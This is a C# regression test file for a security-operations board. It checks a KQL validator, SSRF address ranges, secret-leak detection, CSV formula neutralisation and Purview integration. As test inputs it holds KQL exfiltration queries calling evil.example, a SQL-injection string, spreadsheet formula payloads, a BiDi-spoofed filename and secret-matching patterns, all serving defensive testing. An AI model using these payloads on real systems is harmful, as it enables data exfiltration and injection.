using System.Net;
using System.Text;
using System.Text.Json;
using Blueboard.Api.Actions;
using Blueboard.Api.Board;
using Blueboard.Api.Core;
using Blueboard.Api.Data;
using Blueboard.Api.Graph;
using Blueboard.Api.Ops;
using Blueboard.Api.Webhooks;
using Blueboard.Contracts;
using Xunit;

namespace Blueboard.Api.Tests;

/// <summary>
/// Regression tests covering the adversarial review security fixes (TOCTOU guards, KQL exfiltration blocking,
/// IPv6 SSRF ranges, protected URL indicators & apps, in-memory policy JSON, credential leak blocking,
/// CSV formula hardening, BiDi sanitisation, follow-up @mention escaping) plus Microsoft Purview & Sentinel MCP integration.
/// </summary>
public class AdversarialAndIntegrationsTests
{
    private const string SpOid = "44556677-8899-40aa-bbcc-001122334455";
    private const string SpAppId = "9999aaaa-bbbb-cccc-dddd-000000001008";

    private sealed class StubHandler(Func<HttpRequestMessage, HttpResponseMessage> fn) : HttpMessageHandler
    {
        public List<(HttpMethod Method, Uri Uri, string? Body)> Requests { get; } = [];

        protected override async Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken ct)
        {
            var body = request.Content is null ? null : await request.Content.ReadAsStringAsync(ct);
            Requests.Add((request.Method, request.RequestUri!, body));
            return fn(request);
        }
    }

    private sealed class CapturingAudit() : Audit(new Db(new Settings { DatabaseUrl = "postgres://u:p@127.0.0.1:1/none" }))
    {
        public readonly List<(string Event, string? Subject)> Events = [];

        public override Task WriteAsync(Guid? actorId, string evt, string? subject, object? detail = null, CancellationToken ct = default)
        {
            Events.Add((evt, subject));
            return Task.CompletedTask;
        }
    }

    [Fact]
    public void Policy_json_setting_loads_in_memory_without_writing_temp_file()
    {
        var tmp = Path.Combine(Path.GetTempPath(), "blueboard-policy.json");
        if (File.Exists(tmp)) File.Delete(tmp);

        var settings = Settings.FromEnvironment(k => k == "BLUEBOARD_POLICY_JSON"
            ? """{"version":1,"protected_apps":["blueboard-api"]}"""
            : null);
        Assert.Null(settings.PolicyFile);
        Assert.NotNull(settings.PolicyJson);

        var policy = Policy.Load(settings);
        Assert.Contains("blueboard-api", policy.ProtectedApps);
        Assert.False(File.Exists(tmp));
    }

    [Fact]
    public void Url_entries_in_protected_indicators_protect_host_and_subdomains()
    {
        var policy = new Policy
        {
            ProtectedIndicators = ["https://login.microsoftonline.com/", "contoso.com/portal"],
        };
        var def = Catalog.Get("block_indicator");

        foreach (var (kind, value) in new[]
        {
            ("domain", "login.microsoftonline.com"),
            ("domain", "sub.login.microsoftonline.com"),
            ("url", "https://login.microsoftonline.com/common/oauth2"),
            ("domain", "app.contoso.com"),
        })
        {
            var prms = def.Validate(JsonSerializer.SerializeToElement(new { indicator_type = kind, value, title = "test" }));
            Assert.Equal(Outcome.Reject, PolicyEngine.Evaluate(def, prms, null, policy).Outcome);
        }

        var safe = def.Validate(JsonSerializer.SerializeToElement(new { indicator_type = "domain", value = "evil.example", title = "test" }));
        Assert.Equal(Outcome.NeedsApproval, PolicyEngine.Evaluate(def, safe, null, policy).Outcome);
    }

    [Fact]
    public void Protected_apps_and_target_type_isolate_disable_service_principal()
    {
        Assert.Equal("app", Catalog.TargetType("disable_service_principal"));

        var inc = new IncidentContext("1005", JsonDocument.Parse($$"""
            {
              "alerts": [{
                "evidence": [{
                  "@odata.type": "#microsoft.graph.security.oauthApplicationEvidence",
                  "appId": "{{SpAppId}}",
                  "objectId": "{{SpOid}}",
                  "displayName": "blueboard-api"
                }]
              }]
            }
            """).RootElement);
        var policy = new Policy { ProtectedApps = ["blueboard-api"] };
        var def = Catalog.Get("disable_service_principal");
        var prms = def.Validate(JsonSerializer.SerializeToElement(new { service_principal_id = SpOid }));

        var decision = PolicyEngine.Evaluate(def, prms, inc, policy);
        Assert.Equal(Outcome.Reject, decision.Outcome);
        Assert.Contains("protected application", decision.Notes[0]);

        var confirmNames = PolicyEngine.ConfirmNames(def, prms, inc);
        Assert.Equal("blueboard-api", confirmNames[0]);
        Assert.Contains(SpOid, confirmNames);
    }

    [Fact]
    public void Unblock_indicator_flags_unlinked_without_false_evidence_mismatch()
    {
        var def = Catalog.Get("unblock_indicator");
        var prms = def.Validate(JsonSerializer.SerializeToElement(new { indicator_id = "12345" }));

        var unlinked = PolicyEngine.Evaluate(def, prms, null, new Policy());
        Assert.Contains(unlinked.Notes, n => n.Contains("not linked to an incident"));

        var inc = new IncidentContext("42", JsonDocument.Parse("""{"alerts":[]}""").RootElement);
        var linked = PolicyEngine.Evaluate(def, prms, inc, new Policy { RequireTargetInIncident = true });
        Assert.DoesNotContain(linked.Notes, n => n.Contains("not in incident"));
    }

    [Fact]
    public void Execution_policy_guard_blocks_delayed_or_held_action_when_policy_tightens()
    {
        var def = Catalog.Get("isolate_device");
        var device = "4b1d7e2c9f0a3b6d8e5c1a7f2e9d0c3b6a8f1e4d";
        var inc = new IncidentContext("42", JsonDocument.Parse($$"""
            {"alerts":[{"evidence":[{"@odata.type":"#microsoft.graph.security.deviceEvidence","mdeDeviceId":"{{device}}","deviceDnsName":"dc01.contoso.local"}]}]}
            """).RootElement);
        var prms = def.Validate(JsonSerializer.SerializeToElement(new { machine_id = device }));

        Assert.Equal(Outcome.NeedsApproval, Broker.GuardExecutionPolicy(def, prms, inc, new Policy()).Outcome);
        // After an emergency broker pause + adding dc01 to protected_devices, GuardExecutionPolicy must reject before execution.
        var afterTighten = Broker.GuardExecutionPolicy(def, prms, inc, new Policy { ProtectedDevices = ["dc01.contoso.local"] });
        Assert.Equal(Outcome.Reject, afterTighten.Outcome);
    }

    [Theory]
    [InlineData("/* hide */ .show version", "P7D")]
    [InlineData("/* unclosed comment .show version", "P7D")]
    [InlineData("externaldata(x:string)[@\"https://evil.example/a.csv\"]", "P7D")]
    [InlineData("print 1 | evaluate http_request('https://evil.example')", "P7D")]
    [InlineData("DeviceEvents | evaluate http_request_post('https://evil.example')", "P7D")]
    [InlineData("evaluate sql_request('Server=evil', 'select 1')", "P7D")]
    [InlineData("DeviceProcessEvents | take 5", "P12H")]
    [InlineData("DeviceProcessEvents | take 5", "P91D")]
    [InlineData("DeviceProcessEvents | take 5", "PT0M")]
    public void Kql_validator_blocks_comment_bypass_outbound_plugins_and_bad_durations(string query, string span) =>
        Assert.Throws<BoardException>(() => Enrichment.ValidateKql(query, span));

    [Theory]
    [InlineData("DeviceProcessEvents | where Timestamp > ago(1h) and FileName has \".exe\" and ProcessCommandLine has \"http_request\" | take 20", "PT12H")]
    [InlineData("// safe comment\nAuditLogs | where OperationName == \"Add member to role\" | take 50", "P30D")]
    [InlineData("/* block comment */ SecurityIncident | take 10", "P90D")]
    public void Kql_validator_allows_safe_hunting_queries(string query, string span) =>
        Assert.Equal(span, Enrichment.ValidateKql(query, span));

    [Theory]
    [InlineData("::127.0.0.1")]
    [InlineData("::10.0.0.1")]
    [InlineData("2002:7f00:0001::1")]
    [InlineData("2001:0000:4136:e378:8000:63bf:3fff:fdd2")]
    [InlineData("2001:0002::1")]
    [InlineData("2001:db8::1")]
    [InlineData("2001:20::1")]
    [InlineData("100::1")]
    public void Outbound_guard_blocks_ipv6_transition_and_special_ranges(string ip) =>
        Assert.False(OutboundGuard.IsPublic(IPAddress.Parse(ip)));

    [Fact]
    public void Notifier_blocks_ip_literals_and_strips_bidi_overrides()
    {
        var n = new Notifier(new HttpClient(), new Db(new Settings { DatabaseUrl = "postgres://u:p@127.0.0.1:1/none" }), null!, null!,
            new Settings { NotifyAllowedHosts = ["203.0.113.10"] });
        Assert.Contains("host name", n.UrlProblem("https://203.0.113.10/hook", "NOTIFY_WEBHOOK_URL"));
        Assert.Equal("file_exe.txt", Notifier.OneLine("file_\u202Etxt.exe".Length > 0 ? "file_\u202Eexe.txt" : ""));
    }

    [Fact]
    public void Followup_body_escapes_spoofed_mentions_in_note()
    {
        var body = WebhookService.SafeFollowupBody("triage-agent", "ping @analyst and @all\nsecond line");
        Assert.StartsWith("Follow-up for @triage-agent (scheduled by @triage-agent):", body);
        var mentions = BoardService.ParseMentions(body);
        Assert.Equal(["triage-agent"], mentions);
    }

    [Fact]
    public void Secret_leak_guard_reserved_status_payload_size_and_single_char_mentions()
    {
        Assert.Equal(["a", "x"], BoardService.ParseMentions("hi @a check @x!"));
        var post = Contract.Read<PostInput>(JsonSerializer.SerializeToElement(new { channel = "a", body = "ok" }));
        Assert.Equal("a", post.Channel);

        Assert.NotNull(BoardService.DetectSecretLeak("-----BEGIN RSA PRIVATE KEY-----\nMIIE..."));
        Assert.NotNull(BoardService.DetectSecretLeak("Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.signaturetokenvalue"));
        Assert.NotNull(BoardService.DetectSecretLeak("secret whsec_abcdefghijklmnopqrstuvwxyz123456"));
        Assert.Null(BoardService.DetectSecretLeak("Checked MDE device 4b1d7e2c9f0a3b6d8e5c1a7f2e9d0c3b6a8f1e4d"));

        Assert.Throws<BoardException>(() => Payloads.Validate("status", JsonSerializer.SerializeToElement(new { state = "action_approved" }), system: false));
        Assert.Throws<BoardException>(() => Payloads.Validate("status", JsonSerializer.SerializeToElement(new { state = "followup" }), system: false));
        Assert.Equal("followup", Payloads.Validate("status", JsonSerializer.SerializeToElement(new { state = "followup" }), system: true).GetProperty("state").GetString());

        var big = JsonSerializer.SerializeToElement(new { confidence = 0.5, blob = new string('x', 70_000) });
        Assert.Throws<BoardException>(() => Payloads.Validate("finding", big, system: false));
    }

    [Fact]
    public void Csv_guard_neutralises_leading_whitespace_and_newlines_before_formulas()
    {
        var report = new Report(new { }, new Coverage(1, 0, 0, 0), new Stat(null, null, 0), new Stat(null, null, 0), new Stat(null, null, 0), new Stat(null, null, 0), [],
            [new IncidentTiming(Guid.Empty, "42", "  =CMD()", "high", "active", DateTimeOffset.UnixEpoch, null, null, null, 1, 0),
             new IncidentTiming(Guid.Empty, "43", "\n=HYPERLINK(\"a\")", "high", "active", DateTimeOffset.UnixEpoch, null, null, null, 1, 0)]);
        var csv = Reporting.Csv(report);
        Assert.Contains("'  =CMD()", csv);
        Assert.Contains("\"'\n=HYPERLINK(\"\"a\"\")\"", csv);
    }

    [Fact]
    public void Purview_evidence_extracts_signals_blobs_teams_and_app_chips()
    {
        var json = File.ReadAllText(Path.Combine(OpsTests.RepoRoot(), "templates", "incidents", "purview-dlp-insider-exfil.json"));
        var root = JsonDocument.Parse(json).RootElement;

        var entities = Entities.Extract(root);
        Assert.Equal(2, entities.PurviewSignals.Count);
        Assert.Contains(entities.PurviewSignals, p => p.Source == "microsoftDataLossPrevention" && p.PolicyOrLabel!.Contains("Australia Privacy Act"));
        Assert.Contains(entities.PurviewSignals, p => p.Source == "microsoftInsiderRiskManagement");
        Assert.Contains(entities.DataAssets, d => d.Kind == "blob" && d.SensitivityLabel == "Highly Confidential - Crown Jewels");
        Assert.Contains(entities.DataAssets, d => d.Kind == "file" && d.SensitivityLabel == "Confidential");
        Assert.Single(entities.CloudApps);

        var summary = IncidentSummary.Build(new SummaryIncident("1008", "Purview DLP", "high", "active", root), [], [], null, DateTimeOffset.UtcNow);
        Assert.Contains(summary.Entities, e => e.Kind == "app" && e.Id == SpOid && e.Label == "Personal Cloud Drive Sync");

        var playbooks = Playbooks.Load(Path.Combine(AppContext.BaseDirectory, "playbooks"));
        Assert.Equal("data-exfiltration-cloud", playbooks.Match(root)?.Id);
    }

    [Fact]
    public async Task Lookup_purview_context_returns_dlp_insider_alerts_and_labels()
    {
        var handler = new StubHandler(req =>
        {
            var path = req.RequestUri!.AbsolutePath;
            var json = path switch
            {
                var p when p.StartsWith("/v1.0/users/", StringComparison.Ordinal) =>
                    """{"id":"11111111-1111-1111-1111-111111110003","displayName":"Mei Chen","userPrincipalName":"m.chen@contoso.com"}""",
                "/v1.0/security/alerts_v2" =>
                    """{"value":[{"id":"dlp-1","title":"Purview DLP match","severity":"high","status":"new","serviceSource":"microsoftDataLossPrevention","evidence":[{"userPrincipalName":"m.chen@contoso.com"}]},{"id":"other-1","title":"Other user","severity":"low","status":"new","serviceSource":"microsoftInsiderRiskManagement","evidence":[{"userPrincipalName":"other@contoso.com"}]}]}""",
                "/v1.0/security/dataSecurityAndGovernance/sensitivityLabels" =>
                    """{"value":[{"id":"lbl-1","name":"Highly Confidential","description":"Crown jewels","sensitivity":3,"isActive":true}]}""",
                _ => """{"value":[]}""",
            };
            return new HttpResponseMessage(HttpStatusCode.OK) { Content = new StringContent(json, Encoding.UTF8, "application/json") };
        });

        var ms = new MsClient(new HttpClient(handler), new FakeCredential());
        var db = new Db(new Settings { DatabaseUrl = "postgres://u:p@127.0.0.1:1/none" });
        var audit = new CapturingAudit();
        var enrich = new Enrichment(db, audit, null!, ms);
        var hunter = new Principal(Guid.NewGuid(), "hunter-1", "Hunter", "agent", [Roles.Poster, Roles.Hunter]);

        var result = JsonDocument.Parse(Json.Serialize(await enrich.LookupPurviewAsync(hunter, "m.chen@contoso.com", true, TestContext.Current.CancellationToken))).RootElement;
        Assert.Equal(1, result.GetProperty("alert_count").GetInt32());
        Assert.Equal("dlp-1", result.GetProperty("dlp_and_insider_alerts")[0].GetProperty("id").GetString());
        Assert.Equal("ok", result.GetProperty("labels_status").GetString());
        Assert.Equal("Highly Confidential", result.GetProperty("sensitivity_labels")[0].GetProperty("name").GetString());
        Assert.Contains(audit.Events, e => e.Event == "enrich.purview_lookup" && e.Subject == "m.chen@contoso.com");

        await Assert.ThrowsAsync<BoardException>(() => enrich.LookupPurviewAsync(hunter, "bad' or '1'='1", true, TestContext.Current.CancellationToken));
    }

    [Fact]
    public async Task Purview_content_guard_blocks_restricted_posts_and_audits_otherwise()
    {
        var handler = new StubHandler(_ => new HttpResponseMessage(HttpStatusCode.OK)
        {
            Content = new StringContent("""{"policyActions":[{"@odata.type":"#microsoft.graph.restrictAccessAction","action":"restrictAccess"}]}""", Encoding.UTF8, "application/json"),
        });
        var ms = new MsClient(new HttpClient(handler), new FakeCredential());
        var actor = new Principal(Guid.NewGuid(), "agent-1", "Agent 1", "agent", [Roles.Poster]);
        var post = new PostInput("intel", "Uploading classified PII extract");

        var blockAudit = new CapturingAudit();
        var blockGuard = new PurviewContentGuard(ms, blockAudit, new Settings { PurviewGuardMode = "block" });
        await Assert.ThrowsAsync<BoardException>(() => blockGuard.InspectPostAsync(actor, post, TestContext.Current.CancellationToken));
        Assert.Contains(blockAudit.Events, e => e.Event == "purview.content_flagged");

        var auditAudit = new CapturingAudit();
        var auditGuard = new PurviewContentGuard(ms, auditAudit, new Settings { PurviewGuardMode = "audit" });
        await auditGuard.InspectPostAsync(actor, post, TestContext.Current.CancellationToken);
        Assert.Contains(auditAudit.Events, e => e.Event == "purview.content_flagged");
    }
}
